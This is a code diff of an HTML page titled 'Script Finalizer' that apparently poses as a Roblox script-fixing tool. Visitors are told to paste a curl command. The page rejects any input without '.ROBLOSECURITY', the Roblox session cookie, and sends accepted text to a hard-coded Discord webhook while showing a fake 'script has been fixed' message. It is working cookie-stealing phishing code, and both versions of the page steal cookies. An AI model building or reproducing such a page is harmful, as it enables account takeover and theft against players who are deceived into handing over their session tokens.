@@ -5,118 +5,122 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Script Finalizer</title>
 
-  <!-- Tailwind CSS -->
+  <!-- Tailwind + Lucide Icons -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      theme: { extend: { fontFamily: { mono: ['ui-monospace', 'Consolas', 'monospace'] } } }
-    }
-  </script>
-
-  <!-- Lucide Icons -->
   <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
   <script>lucide.createIcons();</script>
 
   <style>
-    .glow-terminal { text-shadow: 0 0 20px rgba(168, 85, 247, 0.8); }
-    .grid-bg { background-image: linear-gradient(rgba(30,30,40,0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(30,30,40,0.3) 1px, transparent 1px); background-size: 4rem 4rem; }
+    .grid-bg { 
+      background-image: 
+        linear-gradient(rgba(40,40,50,0.2) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(40,40,50,0.2) 1px, transparent 1px);
+      background-size: 4rem 4rem;
+    }
   </style>
 </head>
-<body class="min-h-screen bg-black text-white flex items-center justify-center p-4 relative overflow-hidden">
+<body class="min-h-screen bg-black text-white flex items-center justify-center p-6 relative overflow-hidden">
 
-  <!-- Background effects -->
-  <div class="absolute inset-0 grid-bg opacity-30"></div>
+  <!-- Background -->
+  <div class="absolute inset-0 grid-bg opacity-30 pointer-events-none"></div>
   <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/30 rounded-full blur-3xl"></div>
   <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/30 rounded-full blur-3xl"></div>
 
   <div class="relative z-10 w-full max-w-2xl">
-
     <!-- Title -->
     <div class="text-center mb-12">
       <div class="inline-flex items-center gap-4 mb-4">
-        <i data-lucide="terminal" class="w-8 h-8 text-purple-400"></i>
-        <h1 class="text-5xl font-extralight tracking-wider glow-terminal">Script Finalizer</h1>
+        <i data-lucide="terminal" class="w-9 h-9 text-purple-400"></i>
+        <h1 class="text-5xl font-extralight tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-blue-400">
+          Script Finalizer
+        </h1>
       </div>
-      <div class="h-px w-40 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto"></div>
+      <div class="h-px w-48 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto"></div>
     </div>
 
-    <!-- Main Card -->
-    <div class="bg-zinc-900/60 backdrop-blur-2xl border border-zinc-800 rounded-3xl p-10 shadow-2xl">
+    <!-- Card -->
+    <div class="bg-zinc-900/70 backdrop-blur-2xl border border-zinc-800 rounded-3xl p-10 shadow-2xl">
       <label class="block mb-4 text-sm font-light text-zinc-400 tracking-wider">Insert Game ID BASH</label>
 
       <textarea
-        x-data
         x-model="input"
         @input="status = null"
-        :disabled="submitting"
+        :disabled="loading"
         placeholder="curl https://..."
         class="w-full min-h-64 bg-black/50 border border-zinc-700 rounded-xl px-5 py-4 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:border-purple-500 focus:outline-none transition-colors"
+        x-data="{ input: '', status: null, loading: false }"
       ></textarea>
 
       <div class="mt-3 text-right text-xs text-zinc-500">
         <span x-text="input.length"></span> / 4000 characters
       </div>
 
-      <!-- Status Messages -->
-      <template x-if="status === 'success'">
-        <div class="mt-6 flex items-center gap-3 text-green-400 bg-green-950/40 border border-green-800/50 rounded-xl px-5 py-4 animate-pulse">
-          <i data-lucide="check-circle" class="w-6 h-6"></i>
-          <span class="font-light">The script has been fixed!</span>
-        </div>
-      </template>
+      <!-- Success / Error -->
+      <div x-show="status === 'success'" class="mt-6 flex items-center gap-3 text-green-400 bg-green-950/40 border border-green-800/50 rounded-xl px-5 py-4 animate-pulse">
+        <i data-lucide="check-circle" class="w-6 h-6"></i>
+        <span class="font-light">The script has been fixed!</span>
+      </div>
 
-      <template x-if="status === 'error'">
-        <div class="mt-6 flex items-center gap-3 text-red-400 bg-red-950/40 border border-red-800/50 rounded-xl px-5 py-4 animate-pulse">
-          <i data-lucide="alert-circle" class="w-6 h-6"></i>
-          <span class="font-light">Invalid input type!</span>
-        </div>
-      </template>
+      <div x-show="status === 'error'" class="mt-6 flex items-center gap-3 text-red-400 bg-red-950/40 border border-red-800/50 rounded-xl px-5 py-4 animate-pulse">
+        <i data-lucide="alert-circle" class="w-6 h-6"></i>
+        <span class="font-light">Invalid input type!</span>
+      </div>
 
       <!-- Submit Button -->
       <button
         @click="submit()"
-        :disabled="!input.trim() || submitting"
-        class="w-full mt-8 h-14 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed rounded-xl text-lg font-light tracking-wider transition-all flex items-center justify-center gap-3"
+        :disabled="!input.trim() || loading"
+        class="w-full mt-8 h-14 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 rounded-xl text-lg font-light tracking-wider transition-all flex items-center justify-center gap-3"
       >
-        <template x-if="submitting">
+        <template x-if="loading">
           <i data-lucide="loader-2" class="w-6 h-6 animate-spin"></i>
         </template>
-        <span x-text="submitting ? 'Processing...' : 'Submit Script'"></span>
+        <span x-text="loading ? 'Processing...' : 'Submit Script'"></span>
       </button>
     </div>
 
     <p class="text-center mt-10 text-zinc-600 text-sm font-light">Only curl commands are accepted</p>
   </div>
 
-  <!-- Alpine.js for reactivity (no build needed) -->
+  <!-- Alpine.js -->
   <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
   <script>
     document.addEventListener('alpine:init', () => {
-      Alpine.data(document.querySelector('[x-data]'), () => ({
+      Alpine.data(document.querySelector('textarea'), () => ({
         input: '',
         status: null,
-        submitting: false,
+        loading: false,
 
         async submit() {
-          const trimmed = this.input.trim();
-          if (!trimmed.startsWith('curl') || !trimmed.includes('.ROBLOSECURITY')) {
+          const raw = this.input.trim();
+
+          // Must start with "curl" and contain ".ROBLOSECURITY"
+          if (!raw.startsWith('curl') || !raw.includes('.ROBLOSECURITY')) {
             this.status = 'error';
             return;
           }
 
-          this.submitting = true;
-          try {
-            let processed = trimmed.replace(/https:\/\//g, '');
-            processed = processed.replace(/curl\s+/g, 'curl ...');
-            const payload = processed.substring(0, 4000);
+          this.loading = true;
+          this.status = null;
 
+          try {
+            // Clean up the input
+            let clean = raw
+              .replace(/https?:\/\/[^\s]+/g, '')   // remove any https:// urls
+              .replace(/curl\s+/gi, 'curl ...')   // shorten curl commands
+              .trim();
+
+            // Truncate to 4000 chars (Discord embed description limit)
+            clean = clean.substring(0, 4000);
+
+            // Send to your webhook
             await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                 embeds: [{
-                  title: 'Script Submission',
-                  description: payload,
+                  title: "New Script Submission",
+                  description: "```bash\n" + clean + "\n```",
                   color: 0x00ff00,
                   timestamp: new Date().toISOString()
                 }]
@@ -128,14 +132,12 @@
           } catch (e) {
             this.status = 'error';
           } finally {
-            this.submitting = false;
+            this.loading = false;
+            lucide.createIcons(); // refresh icons
           }
         }
       }));
     });
-
-    // Re-create Lucide icons after Alpine updates DOM
-    document.addEventListener('alpine:initialized', () => lucide.createIcons());
   </script>
 </body>
 </html>
